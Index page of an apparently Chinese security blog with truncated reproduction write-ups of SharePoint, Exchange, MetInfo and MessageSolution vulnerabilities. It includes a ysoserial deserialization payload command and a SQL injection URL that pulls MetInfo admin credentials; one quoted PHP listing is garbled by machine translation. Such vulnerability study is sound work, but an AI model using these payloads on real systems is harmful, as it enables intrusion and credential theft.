<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/62/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Microsoft SharePoint/（CVE-2020-1181）Microsoft SharePoint 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Microsoft%20SharePoint/%EF%BC%88CVE-2020-1181%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.381Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-1181）Microsoft-SharePoint-远程代码执行漏洞"><a href="#（CVE-2020-1181）Microsoft-SharePoint-远程代码执行漏洞" class="headerlink" title="（CVE-2020-1181）Microsoft SharePoint 远程代码执行漏洞"></a>（CVE-2020-1181）Microsoft SharePoint 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p><code>SharePoint Portal Server</code><br>是一套门户网站解决方案，使得企业能够便捷地开发出智能的门户网站，能够无缝连接到用户、团队和知识。因此用户能够更好地利用业务流程中的相关信息，更有效地开展工作。</p>
<p>当<code>Microsoft SharePoint Server</code>无法正确识别和过滤不安全的<code>ASP.Net Web</code>控件时，将会存在一处远程代码执行漏洞。成功利用此漏洞的远程攻击者(需要身份验证)通过创建特制的页面，可以在<code>SharePoint</code>应用进程池的上下文中执行任意代码。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Microsoft SharePoint Enterprise Server 2016Microsoft SharePoint Foundation 2010 Service Pack 2Microsoft SharePoint Foundation 2013 Service Pack 1Microsoft SharePoint Server 2019</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c cale.exe
</code></pre>
<p><img src="/resource/(CVE-2020-1181)MicrosoftSharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
<p>替换掉poc.xml内的payload</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Microsoft%20SharePoint/%EF%BC%88CVE-2020-1181%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Microsoft%20SharePoint/%EF%BC%88CVE-2020-1181%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qs4u00b9y8v1fz7r7c74" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Microsoft SharePoint/（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Microsoft%20SharePoint/%EF%BC%88CVE-2019-0604%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.378Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-0604）Microsoft-SharePoint-远程代码执行漏洞"><a href="#（CVE-2019-0604）Microsoft-SharePoint-远程代码执行漏洞" class="headerlink" title="（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞"></a>（CVE-2019-0604）Microsoft SharePoint 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Microsoft<br>SharePoint是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。</p>
<p>Microsoft SharePoint<br>远程代码执行漏洞（CVE-2019-0594、CVE-2019-0604，高危）：Microsoft<br>SharePoint软件无法检查应用程序包源标记时触发该漏洞。攻击者可在SharePoint应用程序池和SharePoint服务器中执行任意代码。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Microsoft SharePoint Enterprise Server 2016SharePoint Foundation 2013 SP1harePoint Server 2010 SP2SharePoint Server 2019</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>ItemPicker Web 控件实际上从来没有在一个 .aspx<br>页面中使用过。但是看看它基类型的用法，EntityEditorWithPicker，说明在<br>/_layouts/15/Picker.aspx 应该有一个 Picker.aspx 文件使用了它。</p>
<p>该页面要求使用选择器对话框的类型通过 URL 的 PickerDialogType<br>参数的形式提供。在这里，可以使用以下两种 ItemPickerDialog<br>类型中的任何一种：</p>
<pre><code>· Microsoft.SharePoint.WebControls.ItemPickerDialog in             Microsoft.SharePoint.dll
· Microsoft.SharePoint.Portal.WebControls.ItemPickerDialog in Microsoft.SharePoint.Portal.dll
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Microsoft%20SharePoint/%EF%BC%88CVE-2019-0604%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Microsoft%20SharePoint/%EF%BC%88CVE-2019-0604%EF%BC%89Microsoft%20SharePoint%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qs4u00b8y8v1g7x99vwm" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Microsoft Exchange/（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Microsoft%20Exchange/%EF%BC%88CVE-2020-16875%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.338Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-16875）Microsoft-Exchange-远程命令执行漏洞"><a href="#（CVE-2020-16875）Microsoft-Exchange-远程命令执行漏洞" class="headerlink" title="（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞"></a>（CVE-2020-16875）Microsoft Exchange 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>有安全人员公开了Exchange<br>Server远程代码执行漏洞（CVE-2020-16875）的利用程序，此漏洞为微软在9月8日例行月度安全更新中披露；Microsoft<br>Exchange在Internet<br>Explorer处理内存中的对象时存在该漏洞。利用此漏洞需要具有以某个Exchange角色进行身份验证的用户权限。</p>
<p>攻击者可通过向受影响的Exchange服务器发送包含特殊的cmdlet参数的邮件来触发此漏洞，成功利用此漏洞的攻击者可在受影响的系统上以system权限执行任意代码。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>需要一个Exchange用户账号</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Microsoft:Exchange_server_2016: cu16/cu17</p>
<p>Microsoft:Exchange_server_2019: cu5/cu6</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Microsoft%20Exchange/%EF%BC%88CVE-2020-16875%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Microsoft%20Exchange/%EF%BC%88CVE-2020-16875%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrxk00b5y8v1da9rav9i" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Microsoft Exchange/（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Microsoft%20Exchange/%EF%BC%88CVE-2020-0688%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.335Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-0688）Microsoft-Exchange-远程命令执行漏洞"><a href="#（CVE-2020-0688）Microsoft-Exchange-远程命令执行漏洞" class="headerlink" title="（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞"></a>（CVE-2020-0688）Microsoft Exchange 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞是由于Exchange Control<br>Panel(ECP)组件中使用了静态秘钥（<code>validationKey</code>和<code>decryptionKey</code>）所导致的。</p>
<p>所有Microsoft Exchange<br>Server在安装后的<code>web.config</code>文件中都拥有相同的<code>validationKey</code>和<code>decryptionKey</code>。这些密钥用于保证<code>ViewState</code>的安全性。而<code>ViewState</code>是ASP.NET<br>Web应用以序列化格式存储在客户机上的服务端数据。客户端通过<code>__VIEWSTATE</code>请求参数将这些数据返回给服务器。</p>
<p>经过身份验证的攻击者可以从身份验证的<code>session</code>中收集<code>ViewStateUserKey</code>，并在登录请求的原始响应中获得<code>__VIEWSTATEGENERATOR</code>。通过这两个值可以利用<code>YSoSerial.net</code>工具生成恶意的<code>ViewState</code>，从而在ECP中执行任意的.NET代码。由于ECP应用程序是以SYSTEM权限运行的，因而成功利用此漏洞的攻击者可以以SYSTEM身份执行任意代码，并完全控制目标Exchange服务器。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
<li><p>  Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30</p>
</li>
<li><p>  Microsoft Exchange Server 2013 Cumulative Update 23</p>
</li>
<li><p>  Microsoft Exchange Server 2016 Cumulative Update 14</p>
</li>
<li><p>  Microsoft Exchange Server 2016 Cumulative Update 15</p>
</li>
<li><p>  Microsoft Exchange Server 2019 Cumulative Update 3</p>
</li>
<li><p>  Microsoft Exchange Server 2019 Cumulative Update 4</p>
</li>
</ul>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><blockquote>
<p>需要一个普通权限的登录账号</p>
</blockquote>
<p>根据网上的漏洞利用方式分析，漏洞出现在Exchange Control Panel<br>（ECP）组件中，所有Microsoft Exchange<br>Server在安装后的<code>web.config</code>文件中都拥有相同的<code>validationKey</code>和<code>decryptionKey</code>。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Microsoft%20Exchange/%EF%BC%88CVE-2020-0688%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Microsoft%20Exchange/%EF%BC%88CVE-2020-0688%EF%BC%89Microsoft%20Exchange%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrxk00b6y8v1e3cx5yfa" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MetInfo/MetInfo系统中一处旧插件导致的ssrf" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MetInfo/MetInfo%E7%B3%BB%E7%BB%9F%E4%B8%AD%E4%B8%80%E5%A4%84%E6%97%A7%E6%8F%92%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84ssrf/" class="article-date">
  <time datetime="2022-07-08T06:25:59.264Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MetInfo系统中隐藏的一处旧插件导致的ssrf"><a href="#MetInfo系统中隐藏的一处旧插件导致的ssrf" class="headerlink" title="MetInfo系统中隐藏的一处旧插件导致的ssrf"></a>MetInfo系统中隐藏的一处旧插件导致的ssrf</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>利用的话，ssrf嘛你可以扫描扫描端口咯。 我这里的话，简单说明利用一下</p>
<p><img src="/resource/MetInfo%E7%B3%BB%E7%BB%9F%E4%B8%AD%E4%B8%80%E5%A4%84%E6%97%A7%E6%8F%92%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84ssrf/media/rId24.png"></p>
<p><img src="/resource/MetInfo%E7%B3%BB%E7%BB%9F%E4%B8%AD%E4%B8%80%E5%A4%84%E6%97%A7%E6%8F%92%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84ssrf/media/rId25.png"></p>
<h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>文件：MetInfo_v6.1.0\app\app\ueditor\php\Uploader.class.php</p>
<p><img src="/resource/MetInfo%E7%B3%BB%E7%BB%9F%E4%B8%AD%E4%B8%80%E5%A4%84%E6%97%A7%E6%8F%92%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84ssrf/media/rId27.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MetInfo/MetInfo%E7%B3%BB%E7%BB%9F%E4%B8%AD%E4%B8%80%E5%A4%84%E6%97%A7%E6%8F%92%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84ssrf/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MetInfo/MetInfo%E7%B3%BB%E7%BB%9F%E4%B8%AD%E4%B8%80%E5%A4%84%E6%97%A7%E6%8F%92%E4%BB%B6%E5%AF%BC%E8%87%B4%E7%9A%84ssrf/" data-id="cl5c2qrs500avy8v12pd5e1l1" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MetInfo/Metinfo任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
  <time datetime="2022-07-08T06:25:59.262Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MetInfo-任意文件读取"><a href="#MetInfo-任意文件读取" class="headerlink" title="MetInfo 任意文件读取"></a>MetInfo 任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo<br>6.0.0~6.1.0版本中的<br>old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MetInfo 6.0.0 MetInfo 6.1.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>进攻分析<br>看下\MetInfo6\app\system\include\module\old_thumb.class.php</p>
<pre><code>&lt;？php 
＃MetInfo企业内容管理系统
＃版权所有（C）MetInfo Co.，Ltd（http://www.metinfo.cn）。版权所有。

define（&#39;IN_MET&#39;）或 退出（&#39;No权限&#39;）;

load :: sys_class（&#39;web&#39;）;

class  old_thumb  扩展了 网络 &#123;

      公共 功能 doshow （） &#123; 全局 $ _M;


        $ DIR = str_replace函数（&#39;../&#39; ，&#39;&#39;，$ _GET [ &#39;目录&#39; ]）;


        if（strstr（str_replace（$ _ M [ &#39;url&#39; ] [ &#39;site&#39; ]，&#39;&#39;，$ dir），&#39;http&#39;））&#123; 
            header（“ Content-type：image / jpeg”）; 
            ob_start（）; 
            readfile（$ dir）; 
            ob_flush（）; 
            flush（）; 死 ;         &#125;



        if（$ _M [ &#39;form&#39; ] [ &#39;pageset&#39; ]）&#123; 
          $ path = $ dir。“＆met-table = &#123;$ _ M [&#39;form&#39;] [&#39;met-table&#39;]&#125;＆met-field = &#123;$ _ M [&#39;form&#39;] [&#39;met-field&#39;]&#125;”“；

        &#125; else &#123; 
          $ path = $ dir; 
        &#125; 
        $ image = thumb（$ path，$ _ M [ &#39;form&#39; ] [ &#39;x&#39; ]，$ _ M [ &#39;form&#39; ] [ &#39;y&#39; ]）; if（$ _M [ &#39;form&#39; ] [ &#39;pageset&#39; ]）&#123;           $ img = explode（&#39;？&#39;，$ image）;           $ img = $ img [ 0 ];         &#125; else &#123;           $ img = $ image;         &#125; if（$ img）&#123;             header（“ Content-type：image / jpeg”）;             ob_start（）;









            readfile（PATH_WEB.str_replace（$ _ M [ &#39;url&#39; ] [ &#39;site&#39; ]，&#39;&#39;，$ img））; 
            ob_flush（）; 
            flush（）; 
        &#125;

    &#125; 
&#125;

＃此程序是一个开放源代码系统，可用于商业用途，请自觉购买商业许可证。
＃版权所有（C）MetInfo Co.，Ltd.（http://www.metinfo.cn）。版权所有。
？&gt;
</code></pre>
<p>从代码中看用看到，$dir直接由$_GET[&#39;dir&#39;]传递进来，并将../置空。目标是进入到第一个，如果里面的readfile($dir);，读取文件。看看如果语句的条件，的英文外面一个strstr函数，判断$dir中http字符串的首次出现位置，实质上，要进入到这个if语句里面，$dir中必须包含http字符串。里面的将$dir中包含$_M[&#39;url&#39;][&#39;site&#39;]的部分放置空，这里可以不用管。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MetInfo/Metinfo%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qrs500auy8v1fob03h7j" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MetInfo/Metinfo 6.1.2 SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MetInfo/Metinfo%206.1.2%20SQL%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2022-07-08T06:25:59.259Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Metinfo-6-1-2-SQL注入"><a href="#Metinfo-6-1-2-SQL注入" class="headerlink" title="Metinfo 6.1.2 SQL注入"></a>Metinfo 6.1.2 SQL注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞文件：/var/www/html/metinfo6.1.2/app/system/message/web/message.class.php<br>漏洞函数：add 37-51行</p>
<pre><code>public function add($info) &#123;
          global $_M;
          if(!$_M[form][id])&#123;
     $message=DB::get_one(&quot;select * from &#123;$_M[table][column]&#125; where module= 7 and lang =&#39;&#123;$_M[form][lang]&#125;&#39;&quot;);
     $_M[form][id]=$message[id];
          &#125;
          $met_fd_ok=DB::get_one(&quot;select * from &#123;$_M[table][config]&#125; where lang =&#39;&#123;$_M[form][lang]&#125;&#39; and  name= &#39;met_fd_ok&#39; and columnid = &#123;$_M[form][id]&#125;&quot;);
  $_M[config][met_fd_ok]= $met_fd_ok[value];
          if(!$_M[config][met_fd_ok])okinfo(&#39;javascript:history.back();&#39;,&quot;&#123;$_M[word][Feedback5]&#125;&quot;);
          if($_M[config][met_memberlogin_code])&#123;
                  if(!load::sys_class(&#39;pin&#39;, &#39;new&#39;)-&gt;check_pin($_M[&#39;form&#39;][&#39;code&#39;]))&#123;

                                           okinfo(-1, $_M[&#39;word&#39;][&#39;membercode&#39;]);
                  &#125;
      &#125;
</code></pre>
<p>漏洞触发点：</p>
<pre><code>$met_fd_ok=DB::get_one(&quot;select * from &#123;$_M[table][config]&#125; where lang =&#39;&#123;$_M[form][lang]&#125;&#39; and  name= &#39;met_fd_ok&#39; and columnid = &#123;$_M[form][id]&#125;&quot;);
</code></pre>
<p>由于无单引号过滤导致sql注入，这个时候尝试注入发现关键词全被替换了，无法注入。于是查看__controler函数发现调用了父类的初始化函数。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MetInfo/Metinfo%206.1.2%20SQL%E6%B3%A8%E5%85%A5/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MetInfo/Metinfo%206.1.2%20SQL%E6%B3%A8%E5%85%A5/" data-id="cl5c2qrs600awy8v1h5a9d64r" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MetInfo/MetInfo 5.3.12 member_login.php sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MetInfo/MetInfo%205.3.12%20member_login.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.257Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MetInfo-5-3-12-member-login-php-sql注入漏洞"><a href="#MetInfo-5-3-12-member-login-php-sql注入漏洞" class="headerlink" title="MetInfo 5.3.12 member/login.php sql注入漏洞"></a>MetInfo 5.3.12 member/login.php sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MetInfo 5.3.12</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>https://www.0-sec.org/member/login.php/aa&#39;UNION%20SELECT%20(select%20concat(admin_id,0x23,admin_pass)%20from%20met_admin_table%20limit%200,1),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa
</code></pre>
<p><img src="/resource/MetInfo5.3.12member_login.phpsql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>

        
          <p class="article-more-link">
            <a href="/2022/07/07/MetInfo/MetInfo%205.3.12%20member_login.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MetInfo/MetInfo%205.3.12%20member_login.php%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrs400asy8v1h0bs0jed" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MessageSolution/MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MessageSolution/MessageSolution%20%E9%82%AE%E4%BB%B6%E5%BD%92%E6%A1%A3%E7%B3%BB%E7%BB%9FEEA%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CNVD-2021-10543/" class="article-date">
  <time datetime="2022-07-08T06:25:59.229Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MessageSolution-邮件归档系统EEA-信息泄露漏洞-CNVD-2021-10543"><a href="#MessageSolution-邮件归档系统EEA-信息泄露漏洞-CNVD-2021-10543" class="headerlink" title="MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543"></a>MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>MessageSolution 企业邮件归档管理系统EEA</p>
